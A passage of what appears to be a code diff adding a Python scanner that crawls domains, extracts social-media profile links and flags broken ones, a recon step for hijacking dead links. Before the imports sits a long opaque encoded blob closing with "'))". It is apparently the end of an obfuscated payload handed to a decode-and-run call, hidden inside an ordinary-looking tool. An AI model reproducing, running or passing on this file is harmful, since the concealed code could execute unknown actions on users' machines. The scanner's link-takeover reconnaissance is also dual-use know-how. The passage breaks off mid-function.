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'))
+import requests
+import re
+import sys
+import argparse
+import time
+import yaml
+import os
+import json
+import csv
+import sqlite3
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from colorama import init, Fore, Style, Back
+import threading
+from urllib.parse import urlparse
+import random
+from modular.banner import print_banner
+from modular.broken_checker import check_broken_link, PLATFORM_CHECKERS
+
+init(autoreset=True)
+
+print_lock = threading.Lock()
+
+def safe_print(message):
+    with print_lock:
+        print(message)
+
+class LoadingAnimation:
+    
+    @staticmethod
+    def loading_bar(iteration, total, prefix='', suffix='', length=40, fill='█'):
+        percent = 100 * (iteration / float(total))
+        filled_length = int(length * iteration // total)
+        bar = fill * filled_length + '-' * (length - filled_length)
+        return f'\r{prefix} |{bar}| {percent:.1f}% {suffix}'
+    
+    @staticmethod
+    def spinner():
+        symbols = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
+        for symbol in symbols:
+            yield symbol
+
+class ColorUtils:
+    @staticmethod
+    def hex_to_ansi(hex_color, is_background=False):
+        if not hex_color or not hex_color.startswith('#'):
+            return None
+        try:
+            hex_color = hex_color.lstrip('#')
+            if len(hex_color) == 3:
+                hex_color = ''.join([c*2 for c in hex_color])
+            r = int(hex_color[0:2], 16)
+            g = int(hex_color[2:4], 16)
+            b = int(hex_color[4:6], 16)
+            if ColorUtils.supports_true_color():
+                if is_background:
+                    return f"\033[48;2;{r};{g};{b}m"
+                else:
+                    return f"\033[38;2;{r};{g};{b}m"
+            else:
+                return ColorUtils.rgb_to_256(r, g, b, is_background)
+        except:
+            return None
+    
+    @staticmethod
+    def rgb_to_256(r, g, b, is_background=False):
+        if r == g == b:
+            gray = round(r / 255 * 23)
+            if is_background:
+                return f"\033[48;5;{232 + gray}m"
+            return f"\033[38;5;{232 + gray}m"
+        r6 = round(r / 255 * 5)
+        g6 = round(g / 255 * 5)
+        b6 = round(b / 255 * 5)
+        color_index = 16 + (r6 * 36) + (g6 * 6) + b6
+        if is_background:
+            return f"\033[48;5;{color_index}m"
+        return f"\033[38;5;{color_index}m"
+    
+    @staticmethod
+    def supports_true_color():
+        term = os.environ.get('TERM', '')
+        colorterm = os.environ.get('COLORTERM', '')
+        if 'truecolor' in colorterm.lower() or '24bit' in colorterm.lower():
+            return True
+        if '256' in term:
+            return True
+        terminal_indicators = ['VSCODE_PID', 'TERM_PROGRAM', 'WT_SESSION', 'KONSOLE_VERSION', 'GNOME_TERMINAL_SCREEN', 'TMUX', 'KITTY', 'ALACRITTY']
+        for indicator in terminal_indicators:
+            if indicator in os.environ:
+                return True
+        return False
+
+    @staticmethod
+    def hex_to_rgb(hex_color):
+        if not hex_color or not hex_color.startswith('#'):
+            return None
+        hex_color = hex_color.lstrip('#')
+        if len(hex_color) == 3:
+            hex_color = ''.join([c*2 for c in hex_color])
+        try:
+            r = int(hex_color[0:2], 16)
+            g = int(hex_color[2:4], 16)
+            b = int(hex_color[4:6], 16)
+            return (r, g, b)
+        except:
+            return None
+
+class DatabaseManager:
+    
+    def __init__(self, db_path="scans.db"):
+        self.db_path = db_path
+        self.init_db()
+    
+    def init_db(self):
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS scans (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp TEXT,
+                domain TEXT,
+                status TEXT,
+                platform TEXT,
+                link TEXT,
+                server TEXT,
+                response_time REAL
+            )
+        ''')
+        conn.commit()
+        conn.close()
+    
+    def save_scan(self, results):
+        if not results:
+            return
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+        timestamp = datetime.now().isoformat()
+        
+        for result in results:
+            if result.get('link') and result['link'] not in ['Not Found', 'Error']:
+                try:
+                    cursor.execute('''
+                        INSERT INTO scans (timestamp, domain, status, platform, link, server, response_time)
+                        VALUES (?, ?, ?, ?, ?, ?, ?)
+                    ''', (
+                        timestamp,
+                        result.get('website', ''),
+                        str(result.get('status', '0')),
+                        result.get('platform', ''),
+                        result.get('link', ''),
+                        result.get('server', ''),
+                        result.get('response_time', 0)
+                    ))
+                except Exception as e:
+                    print(f"[DEBUG] Save error: {e}")
+        
+        conn.commit()
+        conn.close()
+    
+    def get_history(self, limit=100):
+        conn = sqlite3.connect(self.db_path)
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT timestamp, domain, platform, link, status
+            FROM scans
+            ORDER BY id DESC
+            LIMIT ?
+        ''', (limit,))
+        results = cursor.fetchall()
+        conn.close()
+        return results
+
+class ProxyManager:
+     
+    def __init__(self, config=None):
+        self.config = config or {}
+        self.proxies = {}
+        self.enabled = self.config.get('enabled', False)
+        
+        if self.enabled:
+            proxy_type = self.config.get('type', 'http')
+            host = self.config.get('host', '127.0.0.1')
+            port = self.config.get('port', 8080)
+            username = self.config.get('username', '')
+            password = self.config.get('password', '')
+            
+            proxy_url = f"{proxy_type}://"
+            if username and password:
+                proxy_url += f"{username}:{password}@"
+            proxy_url += f"{host}:{port}"
+            
+            self.proxies = {
+                'http': proxy_url,
+                'https': proxy_url
+            }
+    
+    def get_proxies(self):
+        return self.proxies if self.enabled else None
+
+class SocMedChecker:
+    def __init__(self, timeout=10, max_workers=20, verbose=False, quiet=False, config=None):
+        self.timeout = timeout
+        self.max_workers = max_workers
+        self.verbose = verbose
+        self.quiet = quiet
+        self.config = config or {}
+        self.results = []
+        self.total_found = 0
+        self.stats = {}
+        self.lock = threading.Lock()
+        self.custom_rules = []
+        self.platforms = {}
+        self.color_cache = {}
+        self.broken_links = []
+        self.active_links = []
+        self.completed_count = 0
+        self.total_domains = 0
+        self.error_count = 0
+        
+        self.session = requests.Session()
+        proxy_manager = ProxyManager(self.config.get('proxy', {}))
+        if proxy_manager.enabled:
+            self.session.proxies.update(proxy_manager.get_proxies())
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] Proxy enabled: {self.config['proxy']['type']}://{self.config['proxy']['host']}:{self.config['proxy']['port']}{Fore.RESET}{Style.RESET_ALL}")
+        
+        self.user_agents = self.config.get('user_agents', [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        ])
+        
+        self.rate_limit = self.config.get('rate_limit', {})
+        self.request_count = 0
+        self.rate_limit_start = time.time()
+        self.auto_adjust = self.rate_limit.get('auto_adjust', True)
+        self.rate_limit_warning_shown = False
+        
+        self.db = DatabaseManager('scans.db')
+        
+        self.color_map = {
+            'instagram': Fore.MAGENTA,
+            'telegram': Fore.CYAN,
+            'youtube': Fore.RED,
+            'tiktok': Fore.MAGENTA,
+            'twitter': Fore.BLUE,
+            'facebook': Fore.BLUE,
+            'linkedin': Fore.BLUE,
+            'github': Fore.WHITE,
+            'reddit': Fore.CYAN,
+            'discord': Fore.MAGENTA,
+            'spotify': Fore.GREEN,
+            'medium': Fore.WHITE,
+            'twitch': Fore.MAGENTA,
+            'threads': Fore.CYAN,
+            'pinterest': Fore.RED,
+            'snapchat': Fore.YELLOW,
+            'onlyfans': Fore.RED
+        }
+        
+        self.platform_patterns = {
+            'instagram': [
+                r'(?:https?:)?\/\/(?:www\.)?instagram\.com\/([a-zA-Z0-9_\.]+)',
+                r'instagram\.com\/([a-zA-Z0-9_\.]+)',
+                r'instagr\.am\/([a-zA-Z0-9_\.]+)',
+            ],
+            'telegram': [
+                r'(?:https?:)?\/\/(?:t\.me|telegram\.org)\/([a-zA-Z0-9_\.]+)',
+                r't\.me\/([a-zA-Z0-9_\.]+)',
+            ],
+            'youtube': [
+                r'(?:https?:)?\/\/(?:www\.)?youtube\.com\/(?:c|channel|user|@)([a-zA-Z0-9_\.\-]+)',
+                r'youtube\.com\/(?:c|channel|user|@)([a-zA-Z0-9_\.\-]+)',
+                r'youtu\.be\/([a-zA-Z0-9_\-]+)',
+            ],
+            'tiktok': [
+                r'(?:https?:)?\/\/(?:www\.)?tiktok\.com\/(?:@)([a-zA-Z0-9_\.]+)',
+                r'tiktok\.com\/(?:@)([a-zA-Z0-9_\.]+)',
+                r'vm\.tiktok\.com\/([a-zA-Z0-9]+)',
+            ],
+            'twitter': [
+                r'(?:https?:)?\/\/(?:www\.)?(?:twitter\.com|x\.com)\/([a-zA-Z0-9_]+)',
+                r'twitter\.com\/([a-zA-Z0-9_]+)',
+                r'x\.com\/([a-zA-Z0-9_]+)',
+            ],
+            'facebook': [
+                r'(?:https?:)?\/\/(?:www\.)?facebook\.com\/([a-zA-Z0-9_\.]+)',
+                r'facebook\.com\/([a-zA-Z0-9_\.]+)',
+                r'fb\.com\/([a-zA-Z0-9_\.]+)',
+            ],
+            'linkedin': [
+                r'(?:https?:)?\/\/(?:www\.)?linkedin\.com\/(?:in|company)\/([a-zA-Z0-9_\-]+)',
+                r'linkedin\.com\/(?:in|company)\/([a-zA-Z0-9_\-]+)',
+            ],
+            'github': [
+                r'(?:https?:)?\/\/(?:www\.)?github\.com\/([a-zA-Z0-9_\-]+)',
+                r'github\.com\/([a-zA-Z0-9_\-]+)',
+            ],
+            'reddit': [
+                r'(?:https?:)?\/\/(?:www\.)?reddit\.com\/(?:user|r)\/([a-zA-Z0-9_\-]+)',
+                r'reddit\.com\/(?:user|r)\/([a-zA-Z0-9_\-]+)',
+            ],
+            'discord': [
+                r'(?:https?:)?\/\/(?:www\.)?discord\.(?:com|gg)\/(?:invite\/)?([a-zA-Z0-9_\-]+)',
+                r'discord\.(?:com|gg)\/(?:invite\/)?([a-zA-Z0-9_\-]+)',
+            ],
+            'spotify': [
+                r'(?:https?:)?\/\/(?:open\.)?spotify\.com\/(?:artist|album|playlist|track)\/([a-zA-Z0-9]+)',
+                r'spotify\.com\/(?:artist|album|playlist|track)\/([a-zA-Z0-9]+)',
+            ],
+            'medium': [
+                r'(?:https?:)?\/\/(?:www\.)?medium\.com\/(?:@)?([a-zA-Z0-9_\-\.]+)',
+                r'medium\.com\/(?:@)?([a-zA-Z0-9_\-\.]+)',
+            ],
+            'twitch': [
+                r'(?:https?:)?\/\/(?:www\.)?twitch\.tv\/([a-zA-Z0-9_]+)',
+                r'twitch\.tv\/([a-zA-Z0-9_]+)',
+            ],
+        }
+        
+        self.platform_shortcuts = {
+            'ig': 'instagram',
+            'tele': 'telegram',
+            'yt': 'youtube',
+            'tt': 'tiktok',
+            'tw': 'twitter',
+            'fb': 'facebook',
+            'in': 'linkedin',
+            'gh': 'github',
+            'rd': 'reddit',
+            'dc': 'discord',
+            'sp': 'spotify',
+            'md': 'medium',
+            'tc': 'twitch'
+        }
+        
+    def load_config(self, config_file):
+        try:
+            with open(config_file, 'r', encoding='utf-8') as f:
+                config = yaml.safe_load(f)
+                if config:
+                    self.config.update(config)
+                    return True
+        except Exception as e:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] Loading config: {e}{Fore.RESET}{Style.RESET_ALL}")
+        return False
+    
+    def load_custom_rules(self, filename):
+        try:
+            with open(filename, 'r', encoding='utf-8') as f:
+                rules = yaml.safe_load(f)
+                if isinstance(rules, list):
+                    self.custom_rules = rules
+                else:
+                    self.custom_rules = [rules]
+                return True
+        except Exception as e:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] Loading custom rules: {e}{Style.RESET_ALL}")
+            return False
+    
+    def check_rate_limit(self):
+        if not self.rate_limit.get('enabled', True):
+            return True
+        
+        current_time = time.time()
+        time_window = self.rate_limit.get('time_window', 60)
+        max_requests = self.rate_limit.get('max_requests', 50)
+        
+        if current_time - self.rate_limit_start > time_window:
+            self.request_count = 0
+            self.rate_limit_start = current_time
+        
+        if self.request_count >= max_requests:
+            wait_time = time_window - (current_time - self.rate_limit_start)
+            if wait_time > 0 and not self.rate_limit_warning_shown:
+                self.rate_limit_warning_shown = True
+                sys.stdout.write('\r' + ' ' * 80 + '\r')
+                sys.stdout.flush()
+                if not self.quiet:
+                    safe_print(f"\n{Style.BRIGHT}{Fore.YELLOW}[WRN] Rate limit reached, waiting {wait_time:.1f}s{Fore.RESET}{Style.RESET_ALL}")
+                time.sleep(wait_time)
+                self.request_count = 0
+                self.rate_limit_start = time.time()
+                self.rate_limit_warning_shown = False
+                self.update_progress()
+            return True
+        
+        self.request_count += 1
+        return True
+    
+    def update_progress(self):
+        if self.total_domains > 0:
+            bar = LoadingAnimation.loading_bar(
+                self.completed_count, 
+                self.total_domains,
+                prefix=f'{Style.BRIGHT}{Fore.CYAN}Progress{Fore.RESET}{Style.RESET_ALL}',
+                suffix=f'{Style.BRIGHT}{Fore.GREEN}{self.completed_count}/{self.total_domains}\n{Fore.RESET}{Style.RESET_ALL}'
+            )
+            sys.stdout.write('\r' + bar)
+            sys.stdout.flush()
+    
+    def get_platform_color(self, platform, is_background=False):
+        cache_key = f"{platform}_{is_background}"
+        if cache_key in self.color_cache:
+            return self.color_cache[cache_key]
+        
+        color = self.color_map.get(platform.lower(), Fore.GREEN if not is_background else Back.GREEN)
+        self.color_cache[cache_key] = color
+        return color
+    
+    def get_random_user_agent(self):
+        return random.choice(self.user_agents)
+    
+    def find_social_links(self, html, domain):
+        links = {}
+        
+        for platform, patterns in self.platform_patterns.items():
+            if not self.platforms.get('all', False) and not self.platforms.get(platform, False):
+                continue
+            
+            found = set()
+            for pattern in patterns:
+                matches = re.findall(pattern, html, re.IGNORECASE)
+                for match in matches:
+                    username = match.split('/')[0].split('?')[0].split('#')[0]
+                    if username and len(username) > 1:
+                        link = self.build_platform_link(platform, username)
+                        if link:
+                            found.add(link)
+            
+            if found:
+                links[platform] = list(found)
+        
+        for rule in self.custom_rules:
+            platform = rule.get('name', '').lower()
+            if not platform:
+                continue
+            
+            if platform in self.platforms and not self.platforms.get(platform, True) and not self.platforms.get('all', False):
+                continue
+            
+            found = set()
+            for pattern in rule.get('regex', []):
+                matches = re.findall(pattern, html, re.IGNORECASE)
+                for match in matches:
+                    if isinstance(match, tuple):
+                        match = match[0] if match else ''
+                    username = str(match).split('/')[0].split('?')[0].split('#')[0]
+                    if username and len(username) > 1:
+                        if '://' in username or username.startswith('http'):
+                            link = username
+                        else:
+                            link = f"https://{platform}.com/{username}"
+                        found.add(link)
+            
+            if found:
+                links[platform] = list(found)
+        
+        return links
+    
+    def build_platform_link(self, platform, username):
+        platform_map = {
+            'instagram': f"https://instagram.com/{username}",
+            'telegram': f"https://t.me/{username}",
+            'youtube': f"https://youtube.com/@{username}" if not username.startswith('@') else f"https://youtube.com/{username}",
+            'tiktok': f"https://tiktok.com/@{username}",
+            'twitter': f"https://twitter.com/{username}",
+            'facebook': f"https://facebook.com/{username}",
+            'linkedin': f"https://linkedin.com/in/{username}",
+            'github': f"https://github.com/{username}",
+            'reddit': f"https://reddit.com/user/{username}",
+            'discord': f"https://discord.gg/{username}",
+            'spotify': f"https://open.spotify.com/playlist/{username}",
+            'medium': f"https://medium.com/@{username}",
+            'twitch': f"https://twitch.tv/{username}"
+        }
+        return platform_map.get(platform)
+    
+    def check_domain(self, domain):
+        if not domain.startswith(('http://', 'https://')):
+            domain = 'https://' + domain
+        
+        if not self.check_rate_limit():
+            return
+        
+        try:
+            start_time = time.time()
+            
+            self.session.headers.update({
+                'User-Agent': self.get_random_user_agent()
+            })
+            
+            response = self.session.get(domain, timeout=self.timeout, allow_redirects=True)
+            status_code = response.status_code
+            response_time = time.time() - start_time
+            
+            server = response.headers.get('Server', 'Unknown')
+            
+            sys.stdout.write('\r' + ' ' * 80 + '\r')
+            sys.stdout.flush()
+            
+            if status_code == 200:
+                if not self.quiet:
+                    safe_print(f"{Style.BRIGHT}{Fore.GREEN}[{status_code}] {Fore.CYAN}{domain}{Fore.RESET} | {server} | {response_time:.2f}s{Style.RESET_ALL}")
+                
+                if self.verbose:
+                    title_match = re.search(r'<title[^>]*>([^<]+)</title>', response.text, re.IGNORECASE)
+                    title = title_match.group(1).strip() if title_match else 'No Title'
+                    if not self.quiet:
+                        safe_print(f"{Style.BRIGHT}{Fore.WHITE}    Title: {title}{Fore.RESET}{Style.RESET_ALL}")
+                
+                social_links = self.find_social_links(response.text, domain)
+                
+                with self.lock:
+                    if social_links:
+                        for platform, links in social_links.items():
+                            for link in links:
+                                result = {
+                                    'status': status_code,
+                                    'website': domain,
+                                    'platform': platform,
+                                    'link': link,
+                                    'server': server,
+                                    'response_time': response_time
+                                }
+                                self.results.append(result)
+                                self.total_found += 1
+                                self.stats[platform] = self.stats.get(platform, 0) + 1
+                                
+                                if not self.quiet:
+                                    platform_color = self.get_platform_color(platform)
+                                    safe_print(f"{Style.BRIGHT}{platform_color}    [{platform.upper()}] {link}{Fore.RESET}{Style.RESET_ALL}")
+                    else:
+                        result = {
+                            'status': status_code,
+                            'website': domain,
+                            'platform': 'none',
+                            'link': 'Not Found',
+                            'server': server,
+                            'response_time': response_time
+                        }
+                        self.results.append(result)
+                        
+            elif 300 <= status_code < 400:
+                location = response.headers.get('Location', '')
+                if not self.quiet:
+                    safe_print(f"{Style.BRIGHT}{Fore.YELLOW}[{status_code}] {Fore.CYAN}{domain}{Fore.RESET} -> {location} | {response_time:.2f}s{Style.RESET_ALL}")
+                
+                if location:
+                    try:
+                        redirect_resp = self.session.get(location, timeout=self.timeout)
+                        if redirect_resp.status_code == 200:
+                            social_links = self.find_social_links(redirect_resp.text, domain)
+                            with self.lock:
+                                for platform, links in social_links.items():
+                                    for link in links:
+                                        result = {
+                                            'status': 200,
+                                            'website': domain,
+                                            'platform': platform,
+                                            'link': link
+                                        }
+                                        self.results.append(result)
+                                        self.total_found += 1
+                                        self.stats[platform] = self.stats.get(platform, 0) + 1
+                                        if not self.quiet:
+                                            platform_color = self.get_platform_color(platform)
+                                            safe_print(f"{Style.BRIGHT}{platform_color}    [{platform.upper()}] {link}{Fore.RESET}{Style.RESET_ALL}")
+                    except:
+                        pass
+            else:
+                if not self.quiet:
+                    safe_print(f"{Style.BRIGHT}{Fore.RED}[{status_code}] {Fore.CYAN}{domain}{Fore.RESET} | {server} | {response_time:.2f}s{Style.RESET_ALL}")
+                with self.lock:
+                    result = {
+                        'status': status_code,
+                        'website': domain,
+                        'platform': 'error',
+                        'link': 'Error',
+                        'server': server,
+                        'response_time': response_time
+                    }
+                    self.results.append(result)
+                    
+        except requests.exceptions.Timeout:
+            sys.stdout.write('\r' + ' ' * 80 + '\r')
+            sys.stdout.flush()
+            if self.verbose and not self.quiet:
+                safe_print(f"{Style.DIM}{Fore.YELLOW}[!] Timeout: {domain}{Fore.RESET}{Style.RESET_ALL}")
+            with self.lock:
+                self.error_count += 1
+                result = {
+                    'status': 'Timeout',
+                    'website': domain,
+                    'platform': 'error',
+                    'link': 'Error',
+                    'server': 'Unknown',
+                    'response_time': self.timeout
+                }
+                self.results.append(result)
+            
+        except requests.exceptions.ConnectionError:
+            sys.stdout.write('\r' + ' ' * 80 + '\r')
+            sys.stdout.flush()
+            if self.verbose and not self.quiet:
+                safe_print(f"{Style.DIM}{Fore.RED}[!] Connection Error: {domain}{Fore.RESET}{Style.RESET_ALL}")
+            with self.lock:
+                self.error_count += 1
+                result = {
+                    'status': 'Connection Error',
+                    'website': domain,
+                    'platform': 'error',
+                    'link': 'Error',
+                    'server': 'Unknown',
+                    'response_time': 0
+                }
+                self.results.append(result)
+            
+        except Exception as e:
+            sys.stdout.write('\r' + ' ' * 80 + '\r')
+            sys.stdout.flush()
+            if self.verbose and not self.quiet:
+                safe_print(f"{Style.DIM}{Fore.RED}[!] Error: {domain} - {str(e)}{Fore.RESET}{Style.RESET_ALL}")
+            with self.lock:
+                self.error_count += 1
+                result = {
+                    'status': 'Error',
+                    'website': domain,
+                    'platform': 'error',
+                    'link': 'Error',
+                    'server': 'Unknown',
+                    'response_time': 0
+                }
+                self.results.append(result)
+        
+        with self.lock:
+            self.completed_count += 1
+            self.update_progress()
+    
+    def process_domains(self, domains):
+        self.total_domains = len(domains)
+        if not self.quiet:
+            safe_print(f"\n{Style.BRIGHT}{Fore.CYAN}[INF] Processing {len(domains)} domains with {self.max_workers} workers{Fore.RESET}{Style.RESET_ALL}")
+            safe_print("")
+        
+        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = {executor.submit(self.check_domain, domain): domain for domain in domains}
+            
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except Exception:
+                    pass
+        
+        sys.stdout.write('\r' + ' ' * 80 + '\r')
+        sys.stdout.flush()
+        if not self.quiet:
+            safe_print("")
+        
+        self.print_error_summary()
+        self.check_broken_links()
+        self.export_broken_links("broken_links.txt")
+    
+    def print_error_summary(self):
+        if self.error_count > 0 and not self.quiet:
+            safe_print(f"\n{Style.BRIGHT}{Fore.YELLOW}[!] {self.error_count} domains failed{Fore.RESET}{Style.RESET_ALL}")
+            if self.verbose:
+                errors = [r for r in self.results if r.get('status') in ['Timeout', 'Connection Error', 'Error']]
+                for error in errors[:5]:
+                    safe_print(f"{Style.DIM}  - {error['website']} ({error['status']}){Fore.RESET}{Style.RESET_ALL}")
+                if len(errors) > 5:
+                    safe_print(f"{Style.DIM}  ... and {len(errors)-5} more{Fore.RESET}{Style.RESET_ALL}")
+    
+    def check_broken_links(self):       
+        broken_links = []
+        active_links = []
+        results = [r for r in self.results if r.get('link') and r['link'] not in ['Not Found', 'Error']]
+        
+        if not results:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.YELLOW}[WRN] No links to check for broken status{Fore.RESET}{Style.RESET_ALL}")
+            return [], []
+        
+        if not self.quiet:
+            safe_print(f"\n{Style.BRIGHT}{Fore.CYAN}[INF] Checking {len(results)} links for broken status...{Fore.RESET}{Style.RESET_ALL}")
+        
+        for result in results:
+            platform = result.get('platform', '').lower()
+            url = result['link']        
+            status, detail = check_broken_link(platform, url)
+            
+            if status == "BROKEN":
+                broken_links.append({
+                    'platform': platform,
+                    'url': url,
+                    'source': result.get('website', ''),
+                    'detail': detail
+                })
+                if not self.quiet:
+                    safe_print(f"{Style.BRIGHT}{Fore.RED}[BROKEN-{platform.upper()}] {url} -> {result.get('website', '')} - {detail}{Fore.RESET}{Style.RESET_ALL}")
+            elif status == "ACTIVE":
+                active_links.append({
+                    'platform': platform,
+                    'url': url,
+                    'source': result.get('website', '')
+                })
+                if not self.quiet:
+                    safe_print(f"{Style.BRIGHT}{Fore.GREEN}[ACTIVE-{platform.upper()}] {url} -> {result.get('website', '')}{Fore.RESET}{Style.RESET_ALL}")
+            else:
+                if not self.quiet:
+                    safe_print(f"{Style.BRIGHT}{Fore.YELLOW}[ERROR-{platform.upper()}] {url} -> {result.get('website', '')} - {detail}{Fore.RESET}{Style.RESET_ALL}")
+            
+            time.sleep(0.3)
+        
+        if not self.quiet:
